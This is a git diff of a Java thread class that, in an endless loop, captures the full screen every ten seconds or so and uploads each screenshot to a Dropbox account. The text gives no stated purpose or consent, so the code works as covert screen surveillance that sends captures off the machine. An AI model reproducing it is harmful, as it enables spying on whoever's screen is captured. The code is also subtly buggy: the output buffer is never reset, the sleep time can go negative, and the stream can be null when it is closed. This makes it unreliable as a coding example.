@@ -12,31 +12,40 @@ import java.util.Date;
 
 public class MyThread extends Thread {
     private DbxClientV2 client;
-    private SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
-    private String fileName;
-    private ByteArrayOutputStream temp = new ByteArrayOutputStream();
-    private Robot robot = new Robot();
-    private Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+    private InputStream in;
 
-    MyThread(DbxClientV2 client) throws AWTException {
+    MyThread(DbxClientV2 client) {
         this.client = client;
     }
 
     @Override
     public void run() {
-        while (true) {
-            try (InputStream in = new ByteArrayInputStream(temp.toByteArray())) {
-                BufferedImage screenshot = robot.createScreenCapture(area);
-                ImageIO.write(screenshot, "png", temp);
+        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
+        BufferedImage screenshot;
+        ByteArrayOutputStream tempOut = new ByteArrayOutputStream();
+        String fileName;
+        long startTime;
+        long sleepTime;
+        try {
+            Robot robot = new Robot();
+            Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+            while (true) {
+                startTime = System.currentTimeMillis();
+                screenshot = robot.createScreenCapture(area);
+                ImageIO.write(screenshot, "png", tempOut);
+                in = new ByteArrayInputStream(tempOut.toByteArray());
                 fileName = "/" + formatter.format(new Date()) + ".png";
                 client.files().uploadBuilder(fileName).uploadAndFinish(in);
-                sleep(5000);
+                sleepTime = 10000 - (System.currentTimeMillis() - startTime);
+                sleep(sleepTime);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                in.close();
             } catch (IOException e) {
                 e.printStackTrace();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            } catch (Exception ex) {
-                ex.printStackTrace();
             }
         }
     }
